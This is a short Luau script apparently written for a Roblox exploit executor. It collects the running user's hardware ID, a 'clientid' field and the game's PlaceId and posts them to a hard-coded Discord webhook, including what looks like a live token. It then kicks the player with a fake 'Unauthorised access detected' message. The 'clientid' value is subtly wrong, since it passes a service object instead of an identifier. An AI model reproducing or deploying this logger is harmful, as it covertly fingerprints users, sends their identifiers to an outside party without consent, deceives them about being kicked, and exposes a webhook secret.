local webhook = "https://discord.com/api/webhooks/1564251522018050158/IAogFQd_1h_8x8TDOWDUd4A3-sLddyBCNlMKc5tYBwgordOJKvJGHB2w_NTDKlYc93cS"

local payload = {
    embeds = {
        {
            title = "yaman",
            description = "logged",
            color = 0xFFFFFF,
            fields = {
                {
                    name = "HWID",
                    value = gethwid(),
                    inline = true
                },
                {
                    name = "clientid",
                    value = game:GetService("RbxAnalyticsService"),
                    inline = true
                },
                {
                    name = "Place ID",
                    value = tostring(game.PlaceId),
                    inline = false
                }
            },
            footer = {
                text = "Made with Luau"
            },
            timestamp = DateTime.now():ToIsoDate()
        }
    }
}

local body = game:GetService("HttpService"):JSONEncode(payload)

local sendRequest = request or http_request
    or (syn and syn.request)
    or (fluxus and fluxus.request)

if not sendRequest then
    warn("Your executor does not expose a supported HTTP request function.")
    return
end

local success, response = pcall(function()
    return sendRequest({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end)

game.Players.LocalPlayer:Kick("[LOLHAX]: Unauthorised access detected.")
